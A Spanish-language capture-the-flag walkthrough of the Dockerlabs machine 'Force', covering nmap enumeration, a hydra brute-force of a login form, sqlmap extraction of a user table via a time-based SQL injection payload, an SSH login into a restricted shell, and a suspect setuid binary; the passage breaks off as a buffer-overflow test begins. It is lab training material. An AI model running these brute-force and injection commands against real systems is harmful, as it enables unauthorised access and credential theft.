# ⚙️ CTF

<img width="1152" height="618" alt="image" src="https://github.com/user-attachments/assets/ff7a4014-ff99-476b-932d-8635a55d7e83" />

♟️ Nombre: Force

🐧 SO: Linux

🛜 Dificiltad: DIFICIL

👥 Creador: kvzlx


# 📋 ENUMERACIÓN 

Vamos a empezar lanzando trazas ICMP para ver si tenemos conectividad con la máquina víctima.

<pre>
  <code>
┌──(root㉿kali)-[/home/kali/Dockerlabs]
└─# ping -c2 172.17.0.3
PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.049 ms
64 bytes from 172.17.0.3: icmp_seq=2 ttl=64 time=0.057 ms

--- 172.17.0.3 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1013ms
rtt min/avg/max/mdev = 0.049/0.053/0.057/0.004 ms

  </code>
</pre>
Vemos que efectivamente tenemos conectividad con la máquina víctima basándonos en el ttl de 64 sabemos que estamos ante una máquina con SO Linux, si fuera Windows estaría cerca de 128 o 128 aunque el ttl es manipulable pero normalmente suele ser así.

Vamos a realizar un escaneo de red para enumerar puertos abiertos y servicios que corren.

<pre>
  <code>
┌──(root㉿kali)-[/home/kali/Dockerlabs]
└─# nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.3 -oN info_ports
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-25 12:23 CET
Nmap scan report for 172.17.0.3
Host is up (0.0000070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
  </code>
</pre>

## Parámetros
<pre>
  <code>
-p- : Escaneo de todos los puertos (Los 65535)

--open: Para que muestre únicamente los puertos que esteán abiertos.

-sS: Para hacer el escaneo sigiloso y sobre todo más rápido.

--min-rate 5000: Para indicarle que no vaya más despacio que 5000 paquetes por segundo

-n: Para indicarle que no queremos que haga resolución DNS es decir que no intente convertir direcciones IP en dominios.

-Pn: Para que no realize host discovering ya que suponemos que la máquina está levantada

-oN: guardar el reporte en un archivo

Vemos que tenemos 2 puertos abiertos el 22 donde corre ssh y el 80 donde corre http. Vamos a enumerar versiones y servicios que corren en cada puerto.
</code>
</pre>

<pre>
  <code>
┌──(root㉿kali)-[/home/kali/Dockerlabs]
└─# nmap -p22,80 -sCV 172.17.0.3
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-25 12:24 CET
Nmap scan report for 172.17.0.3
Host is up (0.000046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:a0:22:8d:33:4a:42:3d:4f:e9:3f:50:d1:ca:bc:76 (ECDSA)
|_  256 ae:00:c4:d6:b4:95:8e:ea:0b:8a:f3:d9:9b:c1:81:63 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:11:00:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.97 seconds

  </code>
</pre>

Accediendo desde el navegador podemos comprobar que se trata de un panel de login en el cual primeramente nos salta un popup con algunos parametros que debe tener la contraseña.

- Uppercase letter
- Lowercase letter
- Al menos un digito
- Al menos 10 caracteres

Si probamos a poner un usuario cualquiera por ejemplo "wvverez" ya nos dice que no existe aunque si probamos con un usuario existente como fue el caso de "admin" nos dice que la contraseña es incorrecta.
Lo siguiente que haremos será hacer fuerza bruta al panel de login con el usuario admin y con los requisitos que nos piden.

Pero antes de ello para reducir el trabajo nos haremos un diccionario en el que solo haya palabras con los requisitos que pide el panel de login, para ello:

<pre>
  <code>
      tr -d '\r' < rockyou.txt | awk 'length($0)>=10 && /[A-Z]/ && /[a-z]/ && /[0-9]/' | sponge rockyou.txt2
  </code>
</pre>

  Bien ahora haremos fuerza bruta al panel de login con el nuevo diccionario.

  <pre>
    <code>
  ┌──(root㉿kali)-[/home/kali/Dockerlabs]
  └─# hydra -l admin -P rockyou.txt2 172.17.0.3 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials."
    </code>
  </pre>

De esta forma conseguimos las credenciales para poder loguearnos en el panel de login. Una vez nos logueamos vemos un panel para agregar notas si agregamos una comilla simple vemos que estamos alterando el sistema ya que nos da un error de SQL.

<img width="691" height="457" alt="image" src="https://github.com/user-attachments/assets/50fd4a3d-f518-48c9-8646-69173d3eb30f" />
<img width="1885" height="162" alt="image" src="https://github.com/user-attachments/assets/17a785d0-995b-4bbb-9060-0594b24fddbe" />

Bien lo siguiente que haremos será dar uso de SQLmap para intentar conseguir bases de datos existentes usaremos el siguiente comando.

<pre>
  <code>
❯ sqlmap -u "http://10.88.0.2/app.php" --data="note=" -p note --cookie="PHPSESSID=g32ujngur7l9uh62fb37id280u" --dbs --batch --keep-alive
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:16:38 /2026-01-25/

[14:16:38] [WARNING] provided value for parameter 'note' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:16:38] [INFO] testing connection to the target URL
[14:16:38] [INFO] testing if the target URL content is stable
[14:16:39] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C

    Payload: note=' AND (SELECT 7646 FROM (SELECT(SLEEP(5)))JadM) AND 'ZGlQ'='ZGlQ
---
[14:16:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.59
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[14:16:51] [INFO] fetching database names
[14:16:51] [INFO] retrieved: 'information_schema'
[14:16:51] [INFO] retrieved: 'hacklab'
available databases [2]:
[*] hacklab
[*] information_schema

[14:16:51] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.88.0.2'
[14:16:51] [WARNING] your sqlmap version is outdated
  </code>
</pre>

Bien vemos 2 bases de datos hacklab y information_schema vamos a listarnos las tablas de la DB hacklab

<pre>
  <code>
    
    ❯ sqlmap -u "http://10.88.0.2/app.php" --data="note=" -p note --cookie="PHPSESSID=g32ujngur7l9uh62fb37id280u" -D hacklab --tables --batch --keep-alive
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.12#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:44:41 /2026-01-25/

[14:44:41] [WARNING] provided value for parameter 'note' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:44:41] [INFO] resuming back-end DBMS 'mysql' 
[14:44:41] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:

[14:44:41] [INFO] retrieved: 'notes'
[14:44:41] [INFO] retrieved: 'users'
Database: hacklab
[2 tables]
+-------+
| notes |
| users |
+-------+

[14:44:41] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.88.0.2'
[14:44:41] [WARNING] your sqlmap version is outdated

  </code>
</pre>

Bien vemos 2 tablas vamos a listarnos ambas y filtraremos ya por sus columnas para poder conseguir credenciales.

<pre>
  <code>
    ❯ sqlmap -u "http://10.88.0.2/app.php" --data="note=" -p note --cookie="PHPSESSID=g32ujngur7l9uh62fb37id280u" -D hacklab -T notes,users -C id,password,username --dump --batch --keep-alive
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:48:07 /2026-01-25/

[14:48:08] [WARNING] provided value for parameter 'note' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly

[14:48:09] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[14:48:09] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[14:48:09] [INFO] starting 4 processes 
[14:48:16] [WARNING] no clear password(s) found                                            
Database: hacklab
Table: users
[3 entries]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 5111fdc7a916715e63197bbab20feb35 | admin    |
| 2  | 72021aa9726470898cc9636076e5e061 | dddd     |
| 3  | wWZ *vgx Rz3j MBQ ZN             | ttttt    |
+----+----------------------------------+----------+

[14:48:16] [INFO] table 'hacklab.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.88.0.2/dump/hacklab/users.csv'
[14:48:16] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.88.0.2'
[14:48:16] [WARNING] your sqlmap version is outdated


  </code>
</pre>

Probando credenciales solo me dejo acceder por ssh como el usuario "ttttt" una vez dentro me di cuenta que no podía ejecutar comandos básicos ya que estaba en una rbash.

<img width="828" height="302" alt="image" src="https://github.com/user-attachments/assets/59cc7cc0-19df-4ae6-885c-84fcad77723e" />
<img width="931" height="635" alt="image" src="https://github.com/user-attachments/assets/69c5b5ab-08a0-421a-b369-dfcc1da69377" />
<img width="843" height="267" alt="image" src="https://github.com/user-attachments/assets/d949ee57-2566-47f8-b230-ae7b93b2fbe0" />

Probando algunas cosas me di de cuenta que realmente está muy restringida con lo cual voy a forzar la entrada por bash antes de entrar vía ssh.

<img width="945" height="433" alt="image" src="https://github.com/user-attachments/assets/d17f7d8d-8eec-4610-aced-f2d916a232b4" />

Bien ya tenemos una bash, vamos a listarnos permisos SUID para ver si encontramos algo interesante.

<img width="891" height="365" alt="image" src="https://github.com/user-attachments/assets/725d9bac-340d-4f22-a191-cc603ff84e11" />

Encontramos este permiso SUID extraño vamos a pasarnoslo a nuestra máquina para poder analizarlo mejor. Antes de eso si le hacemos un file vemos que es un ELF ejecutable de 32 bits.

<pre>
  <code>
ttttt@5b855bbf2e63:~$ file /home/ttttt/bf/vuln 
/home/ttttt/bf/vuln: setuid ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=bfa7c8132e92686e0a3924f21d33a0b5fbec952d, for GNU/Linux 4.4.0, not stripped
ttttt@5b855bbf2e63:~$ 
  </code>
</pre>

Viendo esto vamos a pasarnoslo a nuestra máquina para poder probar cosas con él. 
Usaremos el siguiente script para pasarle "A" hasta que crashee para saber si es vulnerable a buffer overflow 